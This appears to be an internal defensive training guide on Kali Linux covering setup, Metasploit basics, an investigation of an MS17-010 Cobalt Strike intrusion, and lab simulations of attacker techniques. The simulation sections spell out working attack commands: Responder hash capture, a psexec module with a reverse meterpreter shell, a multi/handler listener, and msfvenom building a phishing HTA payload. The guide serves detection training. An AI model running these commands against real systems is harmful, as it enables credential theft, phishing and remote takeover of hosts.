# Kali Linux

Kali Linux is a multi-purpose security auditing Linux distribution designed specifically for security professionals.  It contains over 300 forensics and penetration testing tools including Metasploit, BurpSuite, Mimikatz, Maltego, Hashcat, OllyDbg, and Volatility, and can run on workstations, servers, devices, tablets, smartphones, and routers.

Kali Linux is built on top of the Debian GNU/Linux distribution.  While Kali 1.0 was based on Debian Wheezy, 2.0 is based on Jessie and uses the Kali Rolling distribution for daily updates to maintain application compatibility and integration. 

This training document will review: 

- [Setting Up Kali Linux](#setting-up-kali-linux)
    - [Run Kali with Live USB](#run-kali-with-live-usb)
    - [Run Kali Virtual Image](#run-kali-virtual-image)
    - [Change Password](#change-password)
    - [Enable Services](#enable-services)
    - [Get Familiar with Tools](#get-familiar-with-tools)
- [Using Kali Linux](#using-kali-linux)
    - [Support Investigations](#support-investigations)
    - [Simulate TTPs](#simulate-ttps)
        - [Obtain and Crack Hashes](#obtain-and-crack-hashes)
        - [HTA with PowerShell Payload](#hta-with-powershell-payload)
        - [Process Migration](#process-migration)

## Setting Up Kali Linux

There are several different ways to boot Kali:

|Mode|Description|
|-|-|
|Live|boots to RAM (run Kali without installing it)|
|Live (failsafe)|boots to RAM with minimal drivers and hardware checks|
|Live (forensics)|boots to RAM, prevents auto-mounting|
|Live USB Persistence|stores data on a partition on the USB|
|Live USB Encrypted Persistence|stores data on an encrypted partition on USB|
|Install|install OS in text mode|
|Graphical Install|install OS in GUI mode|

Here we'll show two ways to run Kali:

- [Run Kali with Live USB](#run-kali-with-live-usb)
- [Run Kali Virtual Image](#run-kali-virtual-image)

### Run Kali with Live USB

Pick an ISO and download:

![](images/Kali%20Linux/image027.png)<br><br>

When complete, verify SHA256 matches what is reported on `kali.org`:

![](images/Kali%20Linux/image028.png)<br><br>

Format the USB drive:

```
# Plug in USB and identify
df -h

# Unmount 
sudo umount /dev/sdb1

# Format with EXT4
sudo mkfs.ext4 /dev/sb1
```

Copy ISO to USB:

```
sudo dd bs=4M if=/path/to/kali.iso of=/dev/sdb1 conv=fdatasync
```

![](images/Kali%20Linux/image029.png)<br><br>

Plug in USB and reboot.  You may need to enter the boot menu and configure BIOS/UEFI to boot from USB.


### Run Kali Virtual Image

Another option is to import an OVA and run Kali Linux on a virtual machine.

Pick an image and download:

![](images/Kali%20Linux/image030.png)<br><br>

When complete, verify SHA256 matches what is reported on `kali.org`:

![](images/Kali%20Linux/image031.png)<br><br>

Import the OVA with `vboxmanage`, modify a few settings, and start:

```
# Import OVA
vboxmanage import kali-linux-2018.2-vbox-amd64.ova

# Modify RAM, CPUs, and USB
vboxmanage modifyvm Kali-Linux-2018.2-vbox-amd64 --memory 4096 --cpus 1 --usb off

# Modify NIC
vboxmanage modifyvm Kali-Linux-2018.2-vbox-amd64 --nic1 bridged --bridgeadapter1 wlp2s0 (or other interface)

# Start VM
vboxmanage startvm Kali-Linux-2018.2-vbox-amd64 --type gui
```

Kali Linux is now running on the VM:

![](images/Kali%20Linux/image032.png)<br><br>

To learn more about options for running and customizing Kali Linux, try the free [Kali Linux Revealed](https://kali.training/lessons/introduction/) course.


### Change Password

The default user account on Kali Linux is the root account.  

Log in with username `root` and password `toor`.

First, change your password with `passwd` command:

![](images/Kali%20Linux/image033.png)<br><br>


### Enable Services

Next, make sure you have an IP address.  If your network has DHCP you can obtain an IP with `dhclient eth0`.

If you want to configure a static address, use the following:

```
echo -e "\niface eth0 inet static\n address <ipaddress>\n netmask 255.255.255.0\n gateway <gatewayip>" >> /etc/network/interfaces
ifconfig eth0 0.0.0.0
service networking reload
```

To go back to DHCP:

```
ifconfig eth0 0.0.0.0
dhclient eth0
```

Network services on Kali are disabled by default so that the system doesn't expose open ports.

Look at network connections with `netstat` and notice there are no services listening:

![](images/Kali%20Linux/image034.png)<br><br>

To start a service, use the `systemctl start <service name>` command.

If you want to be able to access your VM using SSH, enable it and confirm it is listening on the desired port:

![](images/Kali%20Linux/image035.png)<br><br>

To configure a service to start at boot, use `systemctl enable <service>`.

For SSH, the default configuration prohibits logins with passwords.  Accessing systems using public key authentication is a best practice so create one by typing the following: 

```
# Generate keys
ssh-keygen

# Add public key to authorized_keys file
cat .ssh/id_rsa.pub >> .ssh/authorized_keys
```


The Kali Linux VM is now configured to accept SSH logins from the root account using the private key you just created.  Copy the private key to a remote system and name it something like `id_rsa_kali` to distinguish it from other keys you may have.  Now, anyone that has the private key can log into the Kali box as the root account via SSH:

![](images/Kali%20Linux/image036.png)<br><br>


### Get Familiar with Tools

Explore the many tools using the Kali Linux menu which organizes them by category:

![](images/Kali%20Linux/image050.png)<br><br>

Use `find` and `locate` to search for other tools such as `nc.exe`, `wce.exe`, and `pscp.exe`.

Always do an `updatedb` before using `locate`.

One of the most useful tools on Kali Linux is Metasploit, an exploit collection and development framework which uses interchangeable modules. 

- Exploit modules perform attacks 
- Auxiliary modules perform scanning and enumeration
- Listeners wait for and handle incoming connections
- Payloads are pieces of code that perform specific tasks on a target system

`msfconsole` is a tool used to interface with the framework.  To use it, either type `msconsole` in the terminal or use the menu to select --> Metasploit.

Show modules within the framework with `show exploits`, `show payloads`, `show auxiliary`.

Search for a module with `search`. Use it with `use`.

Once you select a module, use `show options`, `show payloads`, and `show targets` to see the module's current configuration. Typing `info` will provide information about the module.

Set and unset parameters with `set` and `unset`, make changes globally with `setg` and `unsetg`.

Try the free [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed) course to learn more.


## Using Kali Linux

Here are a few examples of how Kali Linux can be a valuable tool for defenders:

- [Support Investigations](#support-investigations)
- [Simulate TTPs](#simulate-ttps)

### Support Investigations

Kali Linux can be used to support investigations where we don't have enough information to report what happened with high confidence.  One example of this is when we identified host X downloading a file named "`a`" from an unknown host on the network:

![](images/Kali%20Linux/image025.png)<br><br>

An Nmap scan indicated the unknown host was a Kali Linux system:

![](images/Kali%20Linux/image024.png)<br><br>

We obtained a copy of the file which appeared to be a Cobalt Strike stager used to initiate a Beacon download:

![](images/Kali%20Linux/image026.png)<br><br>

The PowerShell processes that downloaded and executed the Beacon were running as SYSTEM:

![](images/Kali%20Linux/image023.png)<br><br>

Several `cmd.exe` and `rundll32.exe` processes were spawned by the Beacon process 3624 (0xe28) which indicated post-exploitation activity:

![](images/Kali%20Linux/image012.png)<br><br>

Seconds before the Beacon started, a failed logon was observed from the IP address using a random hostname:

![](images/Kali%20Linux/image019.png)<br><br>

The process chain of this attack was found to be:

`lsass.exe` --> `cmd.exe` --> `powershell.exe`

The `lsass.exe` process spawning a child process indicated the use of a kernel-mode payload such as Double Pulsar which can inject arbitrary DLLs into a process.

Looking at what we knew up to that point, we created a timeline showing:
- the failed logon from the Kali box
- a successful logon from a valid account
- then the LSASS process being started
- the valid account logoff event
- the powershell script running
- the second powershell process being created

![](images/Kali%20Linux/image018.png)<br><br>

This all supported the theory that the Kali Linux host successfully implanted a Cobalt Strike Beacon in the victim host, but there were still some questions surrounding what happened:

1. How was this server discovered/targeted?
2. Was a vulnerability exploited to deploy the Beacon?  If so, what was it?
3. Was the valid account necessary to carry out this attack?

<br>

To answer these, we simulated the attack with Kali Linux in a lab environment.

Running the EternalBlue/DoublePulsar exploit on a host that’s not vulnerable can cause it to crash so a scanner module was created in Metasploit to confirm if a host is vulnerable before launching the exploit.

Using the MS17-010 scanner module without a valid account created an error but using it with a valid account showed if the host was vulnerable:

![](images/Kali%20Linux/image001.png)<br><br>

Checking the logs of the target host revealed the Logon/Logoff events we observed containing randomly-generated hostnames:

![](images/Kali%20Linux/image002.png)<br><br>

![](images/Kali%20Linux/image003.png)<br><br>

This showed the victim host, possibly the entire subnet, was scanned to confirm the presence of the vulnerability before actually launching the exploit.

In the lab environment, the MS17-010 exploit module ran successfully without a valid account and immediately resulted in the payload running under the SYSTEM account.

![](images/Kali%20Linux/image004.png)<br><br>

In the logs, this cmd.exe process is seen being created by the exploited process right after the logon session:

![](images/Kali%20Linux/image005.png)<br><br>

This showed that the valid account wasn't necessary to carry out the attack, but had been used to confirm the presence of the vulnerability.  Also, that this was most likely the exploit used as with its default settings it uses `lsass.exe` to spawn `cmd.exe` to run the payload.  In this case the payload was a powershell command which downloaded and ran the Cobalt Strike Beacon implant.

We were then able to say with high confidence that:

1. The server was discovered by a scan searching for hosts vulnerable to MS17-010
2. All evidence suggests the host was vulnerable to MS17-010 and this was used to deploy the Beacon
3. The valid account was necessary to confirm the host was vulnerable to MS17-010, but not necessary to carry out the exploit

<br>

We can also use Kali Linux to simulate TTPs, observe what they look like on the network and endpoints, and examine the artifacts that are created.

### Simulate TTPs

Three primary TTPs we saw in the latest exercises were:

|TTP|Description|
|-|-|
|[Obtain and Crack Hashes](#obtain-and-crack-hashes)|Obtain and crack password hashes to use with PSEXEC module|
|[HTA with PowerShell Payload](#hta-with-powershell-payload)|Phish users via .hta file with powershell payload|
|[Process Migration](#process-migration)|Use process migration to hide and persist in memory|

<br>

We can simulate various TTPs using Kali Linux and explore different ways to detect them being used in our environment.


#### Obtain and Crack Hashes

Kerberoasting can be used to obtain password hashes from a domain controller.  Without standing up an active directory environment, we can quickly simulate this by capturing password hashes with [Responder](https://github.com/SpiderLabs/Responder) which comes installed with Kali.

Start [Responder](https://github.com/SpiderLabs/Responder) with `responder -I eth0` and it will begin listening on the network for LLMNR, NBT-NS and MDNS name queries.

With the Windows Analysis VM, attempt to connect to a non-existent file server (WHATEVER):

```powershell
net use x: \\WHATEVER
```

[Responder](https://github.com/SpiderLabs/Responder) sees and answers the request while capturing the account's password hash:

![](images/Kali%20Linux/image037.png)<br><br>

The hash can now be cracked with a tool such as [HashCat](https://github.com/hashcat/hashcat):

Cut and paste the entire hash into a file named `hash.txt`

![](images/Kali%20Linux/image038.png)<br><br>

Run with the correct mode and wordlist (password must be in the wordlist you choose):

![](images/Kali%20Linux/image039.png)<br><br>

The account password will be in the `answer.txt` file:

![](images/Kali%20Linux/image040.png)<br><br>

Once the password was obtained, it was used with [Cobalt Strike](https://www.cobaltstrike.com/)'s `psexec_psh` module to start a service running as SYSTEM on a target machine.  We can simulate that using Metasploit's `exploit/windows/smb/psexec` module.

Type `msfconsole` to start up the Metasploit Framework console.

Type the following to select and configure the module:

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_https
set rhost <target-ip>
set lhost <attacker-ip>
set lport 443
set smbuser <username>
set smbpass <password>
```


![](images/Kali%20Linux/image041.png)<br><br>

You may need to change the Windows Firewall profile from Public to Private to allow the connection.  Once this is confirmed, type `run` to execute:

![](images/Kali%20Linux/image042.png)<br><br>

A service is created and you now have a shell running as SYSTEM on the target machine.

Check the target machine to see what process the service started:

![](images/Kali%20Linux/image043.png)<br><br>


#### HTA with PowerShell Payload

X used Cobalt Strike to generate HTA files with a PowerShell payload.  We can simulate this with Kali.

First, terminate the meterpreter session from above by typing `exit` in msfconsole.

Switch to the multi/handler and configure it for the HTA's payload we're about to create:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.1.18
set LPORT 443
run
```

The C2 server should now be listening on port 443:

![](images/Kali%20Linux/image046.png)<br><br>

Next, use `msfvenom` to create the file:

```
msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_https RHOST=<attack ip> LPORT=443 -f hta-psh > phish.hta
```

This creates the HTA file and saves it as `phish.hta`.

Now start a web server in that directory on port 8000 with `python -m SimpleHTTPServer`

With the Windows host, browse to port 8000 on the Kali machine, download `phish.hta`, and run it:

![](images/Kali%20Linux/image044.png)<br><br>

The PowerShell payload is executed and you now have a shell running as the user on the target machine:

![](images/Kali%20Linux/image045.png)<br><br>

Verify that this meterpreter agent is also running in a PowerShell process:

![](images/Kali%20Linux/image047.png)<br><br>

#### Process Migration

As soon as NCATS had control of a target host with their agent, they migrated out of the `powershell.exe` process to a less suspicious process such as `iexplore.exe` or `dwm.exe`.  We can simulate this with meterpreter.

Get a list of processes on the target machine with `ps`:

![](images/Kali%20Linux/image048.png)<br><br>

Pick a process and migrate to it using `migrate <pid>`.  If successful, check with meterpreter command `getpid`, then confirm by checking the process migrated to on target host:

![](images/Kali%20Linux/image049.png)<br><br>
